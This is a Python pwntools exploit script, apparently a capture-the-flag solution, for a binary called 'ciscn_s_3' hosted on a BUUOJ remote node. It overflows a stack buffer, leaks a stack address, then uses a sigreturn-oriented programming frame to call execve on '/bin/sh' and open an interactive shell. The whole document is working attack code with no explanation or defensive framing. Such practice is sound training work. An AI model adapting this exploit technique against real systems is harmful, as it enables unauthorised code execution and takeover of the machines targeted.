#!/usr/bin/env python
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
#context.terminal = ['lxterminal', '-e']

local = 0
if local:
	p = process('./ciscn_s_3')
else:
	p = remote('node3.buuoj.cn', 28526)

#gdb.attach(p)

vuln_addr = 0x4004f1
set_sigreturn_addr = 0x4004da
set_execve_addr = 0x4004e2
syscall_ret = 0x400517

payload = '/bin/sh\x00'.ljust(16, 'A') + p64(vuln_addr)
raw_input('@')
p.send(payload)
p.recv(32)
stack_addr = u64(p.recv(8))
info('stack_addr = ' + hex(stack_addr))

bin_sh_addr = stack_addr - 0x118
payload = 'A' * 16 + p64(set_sigreturn_addr) + p64(syscall_ret)
frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = bin_sh_addr
frame.rip = syscall_ret
payload += str(frame)
raw_input('@')
p.send(payload)

p.interactive()
